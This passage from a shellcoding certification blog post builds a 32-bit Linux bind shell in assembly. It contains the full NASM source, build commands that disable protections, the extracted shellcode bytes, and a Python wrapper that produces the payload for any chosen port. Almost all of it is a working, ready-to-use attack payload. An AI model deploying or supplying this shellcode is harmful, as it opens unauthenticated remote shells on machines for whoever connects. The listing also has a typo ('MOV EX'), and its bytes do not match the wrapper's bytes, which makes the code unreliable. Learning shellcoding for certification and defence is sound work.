        MOV BL, 2        ; set domain argument
        MOV CL, 1        ; set type argument
        MOV DL, 6        ; set protocol argument
        INT 0x80         ; interrupt

        MOV EDI, EAX     ; as result of socket syscall descriptor is saved in EAX
                         ; descriptor will be used with several other syscalls so
                         ; we need to save it some how for later use. One way is
                         ; to save it in EDI register which is least likely to be 
                         ; used in following syscalls
    
        ; bind syscall
        XOR  ECX, ECX    ; clear ECX so that we can push zero to the stack
        PUSH ECX         ; push INADDR_ANY = 0.0.0.0 to the stack
        PUSH ECX
        PUSH word 0x5c11 ; push hex 0x115c (dec 4444) in reverse order due to little endian
        PUSH word 0x2   ; push hex 0x02 (dec 2) on the stack. 2 represents AF_INET
        MOV ECX, ESP     ; move address pointing to the top of the stack to ECX

        MOV EBX, EAX     ; copy value from EAX to EBX, EAX holds pointer to socket descriptor as result of socket call
        MOV AX, 0x169    ; move bind syscall number in EAX register
        MOV DL, 0x16     ; move value 0x16 to EDX as third parameter
        INT 0x80         ; interrupt

        ; listen syscall
        XOR EAX, EAX     ; set EAX to zero
        MOV AX, 0x16B    ; move 0x16B to EAX
        MOV EBX, EDI     ; move socket descriptor into EBX as first argument
        MOV CL,  0x2     ; move "2" as backlog into ECX as second argument
        INT 0x80         ; interrupt

        ; accept syscall
        XOR EAX, EAX     ; set EAX to zero for clean start
        MOV EX, 0x16C    ; move accept syscall number (0x16C) in EAX
        MOV EBX, EDI     ; move socket descriptor from EDI to EBX as first argument
        XOR ECX, ECX     ; set ECX to zero as argument is NULL
        XOR EDX, EDX     ; set EDX to zero as argument is NULL
        XOR ESI, ESI     ; set flag to 0 by XOR-ing
        INT 0x80         ; interrupt

        XOR EDI, EDI     ; set EDI to zero
        MOV EDI, EAX     ; As result, new socket descriptor will be saved in EAX 
                         ; so we can move it to EDI for further use.

        ; dup2 syscall
        MOV CL, 0x3     ; putting 3 in the counter

LOOP_DUP2:
        XOR EAX, EAX    ; clear EAX
        MOV AL, 0x3F    ; putting the syscall code in EAX
        MOV EBX, EDI    ; putting our new socket descriptor in EBX
        DEC CL          ; decrementing CL by one (so at first CL will be 2 then 1 and then 0)
        INT 0x80        ; interrupt
        JNZ LOOP_DUP2   ; "jump non zero" jumping back to the top of LOOP_DUP2 if the zero flag is not set

 
        ; execve syscall
        XOR EAX, EAX
        PUSH EAX
        PUSH 0x68732f6E
        PUSH 0x69622f2F
        MOV EBX, ESP
        PUSH EAX
        MOV EDX, ESP
        PUSH EBX
        MOV ECX, ESP
        MOV AL, 0x0B
        INT 0x80
</pre></table></code></div></div><p>We can compile and link code with:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nasm -f elf32 bind.nasm -o bind.o
ld -z execstack -o bind bind.o  -m elf_i386
</pre></table></code></div></div><p>And when we run it, we can confirm that application is indeed listening on port 4444 and provides shell to whoever connects to listening port.</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://smarinovic.github.io/assets/img/slae_00002.png" alt="bind shell" /></p><p>We can use objdump to get shellcode out:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>objdump -d bind |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc9\x51\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x89\xc3\x66\xb8\x69\x01\xb2\x16\xcd\x80\x31\xc0\xb8\x6b\x01\x00\x00\x89\xfb\xb1\x02\xcd\x80\x31\xc0\xb8\x6c\x01\x00\x00\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
</pre></table></code></div></div><p>And when we put it is skeleton C program, we can also confirm it works with netstat:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gcc -fno-stack-protector -z execstack -m32 skeleton.c -o bind_shell
</pre></table></code></div></div><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://smarinovic.github.io/assets/img/slae_00004.png" alt="opcode test" /></p><h2 id="wrapper">Wrapper</h2><p>Last task was to make port argument easily configurable. Suggested way is to create wrapper. To create wrapper, we need to find where port number is located. Port number is 4444 which is presented as hex (little endian format): \x11\x5c. When we know the location of port, we can split shell code in pre-port part and post-port part. Python script generates hex representation of given port number and combines all three parts (pre-port, port and post-port part of shell code) in new shell code.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>import sys

shell1 = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xb2\\x06\\xcd\\x80\\x89\\xc7\\x31\\xc9\\x51\\x51\\x66\\x68"
port = "\\x11\\x5c"
shell2 = "\\x66\\x6a\\x02\\x89\\xe1\\x89\\xc3\\x66\\xb8\\x69\\x01\\xb2\\x16\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\xb1\\x02\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

if len(sys.argv) != 2:
   print 'Usage: wrapper.py &lt;port&gt;'
   sys.exit(-1)

else:
   port_number = sys.argv[1]             # read port number sent as argument

   try:
      port_number = int(port_number)
      port_number = hex(port_number)
      port_num = port_number.replace("0x","")

      if len(port_num) &lt; 4:
         port_num = "0" + str(port_num)

      port_num1 = str(port_num[:2])
      port_num2 = str(port_num[2:])

      print ('"' + shell1 + "\\x" + port_num1 + "\\x" + port_num2 + shell2 + '";')

   except:
      print ("Port must be number")

</pre></table></code></div></div><p>For test we will generate bind shell code for port 3333:</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://smarinovic.github.io/assets/img/slae_00006.png" alt="wrapper test" /></p><p>Resulting opcode:</p><p><code class="language-plaintext highlighter-rouge">"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc7\x31\xc9\x51\x51\x66\x68\x0d\x05\x66\x6a\x02\x89\xe1\x89\xc3\x66\xb8\x69\x01\xb2\x16\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\xb1\x02\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";</code></p><p>we need to copy into skeleton.c, compile and run it, and as result bind_shell is listening on port 3333 as shown on following screen shot.</p><p><img class="lozad" src= /assets/img/commons/loading.png data-src="https://smarinovic.github.io/assets/img/slae_00007.png" alt="wrapper test" /></p><h2 id="references">References</h2><ul><li><a href="https://h0mbre.github.io/">h0mbre</a></li><li><a href="https://coffeegist.com/">Coffeegist</a></li><li><a href="https://www.abatchy.com/">Abatchy blog</a></li></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/blogging/'>Blogging</a>, <a href='/categories/tutorial/'>Tutorial</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/slae/" class="post-tag no-text-decoration" >slae</a> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >shellcoding</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Linux bind shell in assembly - &url=https://smarinovic.github.io/posts/Bind-shell/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Linux bind shell in assembly - &u=https://smarinovic.github.io/posts/Bind-shell/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Linux bind shell in assembly - &url=https://smarinovic.github.io/posts/Bind-shell/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/bufferoverflow/">bufferoverflow</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/slae/">slae</a> <a class="post-tag" href="/tags/seh/">SEH</a> <a class="post-tag" href="/tags/encoder/">encoder</a> <a class="post-tag" href="/tags/egghunter/">egghunter</a> <a class="post-tag" href="/tags/decoder/">decoder</a> <a class="post-tag" href="/tags/eip/">EIP</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled"><p>-</p></span> <a href="/posts/Reverse-shell/" class="btn btn-outline-primary"><p>Linux reverse shell in assembly</p></a></div><!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Reverse-shell/"><div class="card-body"> <span class="timeago small"> May 27, 2020 <i class="unloaded">2020-05-27T17:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Linux reverse shell in assembly</h3><div class="text-muted small"><p>Introduction Objective of this blog post is to explain process of creating reverse shell in assembly language for 32 bit Linux. Blog post was created for the SLAE certification exam and it descri...</p></div></div></a></div><div class="card"> <a href="/posts/EggHunter/"><div class="card-body"> <span class="timeago small"> Jun 9, 2020 <i class="unloaded">2020-06-09T16:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Egg Hunter</h3><div class="text-muted small"><p>Introduction Egg Hunter is super useful and simple piece of code used to search for an defined series of bytes called “egg” in a memory. Egg as such is just a 4 bytes string, usually: “w00t” (but ...</p></div></div></a></div><div class="card"> <a href="/posts/Custom-Encoder/"><div class="card-body"> <span class="timeago small"> Jun 10, 2020 <i class="unloaded">2020-06-10T16:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Custom Encoder</h3><div class="text-muted small"><p>Introduction Sending well known shell code to target machine would most probably be detected by antimalware solution . One way to bypass antimalware detection is to encode shell code and to have ...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const observer = lozad(); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2020 <a href="https://twitter.com/stipemarinovic">Stipe Marinovic</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank">Jekyll</a> with theme <a href="https://github.com/cotes2020/jekyll-theme-chirpy/">Chirpy</a>.</p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/fuzzing/">fuzzing</a> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/bufferoverflow/">bufferoverflow</a> <a class="post-tag" href="/tags/bof/">bof</a> <a class="post-tag" href="/tags/slae/">slae</a> <a class="post-tag" href="/tags/seh/">SEH</a> <a class="post-tag" href="/tags/encoder/">encoder</a> <a class="post-tag" href="/tags/egghunter/">egghunter</a> <a class="post-tag" href="/tags/decoder/">decoder</a> <a class="post-tag" href="/tags/eip/">EIP</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-11473652-4', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://smarinovic.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
